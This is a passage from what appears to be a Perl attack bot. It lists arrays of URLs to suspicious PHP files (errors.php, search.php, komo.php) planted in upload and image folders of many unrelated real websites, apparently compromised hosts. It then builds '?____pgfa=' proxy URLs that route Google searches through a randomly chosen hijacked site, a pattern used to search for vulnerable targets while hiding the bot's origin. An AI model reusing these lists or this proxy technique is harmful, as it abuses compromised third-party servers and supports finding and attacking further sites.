my @randombarner11 = ("http://www.wtpolytech.com/th/includes/config.index.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://s195003287.online.de/Platz/administrator/templates/index2.php","http://www.voileenligne.com/audio/komo.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://cmssa.com.br//php/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://www.lesyro.cz//images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://iidh-jurisprudencia.ac.cr/bibliote/images/stories/error.php");

my @randombarner12 = ("http://s195003287.online.de/Platz/administrator/templates/index2.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://www.lesyro.cz//images/stories/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://viewwebinars.com/wp-includes/errors.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://cmssa.com.br//php/error.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://viewwebinars.com/wp-includes/errors.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.mdcsystems.com/plugins/content/config.inc.php");

my @randombarner13 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php");

my @randombarner14 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php");

my @randombarner15 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php");

my @randombarner16 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php");

my @randombarner17 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php");

my @randombarner18 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php");

my @randombarner19 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php");

my @randombarner20 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.allsocool.com.au/php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php");



my $fullmagic1  	= $randombarner1[rand(scalar(@randombarner1))];
my $fullmagic2  	= $randombarner2[rand(scalar(@randombarner2))];
my $fullmagic3  	= $randombarner3[rand(scalar(@randombarner3))];
my $fullmagic4  	= $randombarner4[rand(scalar(@randombarner4))];
my $fullmagic5  	= $randombarner5[rand(scalar(@randombarner5))];
my $fullmagic6  	= $randombarner6[rand(scalar(@randombarner6))];
my $fullmagic7  	= $randombarner7[rand(scalar(@randombarner7))];
my $fullmagic8  	= $randombarner8[rand(scalar(@randombarner8))];
my $fullmagic9  	= $randombarner9[rand(scalar(@randombarner9))];
my $fullmagic10  	= $randombarner10[rand(scalar(@randombarner10))];
my $fullmagic11  	= $randombarner11[rand(scalar(@randombarner11))];
my $fullmagic12  	= $randombarner12[rand(scalar(@randombarner12))];
my $fullmagic13  	= $randombarner13[rand(scalar(@randombarner13))];
my $fullmagic14  	= $randombarner14[rand(scalar(@randombarner14))];
my $fullmagic15  	= $randombarner15[rand(scalar(@randombarner15))];
my $fullmagic16  	= $randombarner16[rand(scalar(@randombarner16))];
my $fullmagic17  	= $randombarner17[rand(scalar(@randombarner17))];
my $fullmagic18  	= $randombarner18[rand(scalar(@randombarner18))];
my $fullmagic19  	= $randombarner19[rand(scalar(@randombarner19))];
my $fullmagic20  	= $randombarner20[rand(scalar(@randombarner20))];


my $jack1	= "".$fullmagic1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack2	= "".$fullmagic2."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack3	= "".$fullmagic3."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack4	= "".$fullmagic4."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack5	= "".$fullmagic5."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack6	= "".$fullmagic6."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack7	= "".$fullmagic7."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack8	= "".$fullmagic8."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack9	= "".$fullmagic9."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack10	= "".$fullmagic10."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack11	= "".$fullmagic11."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
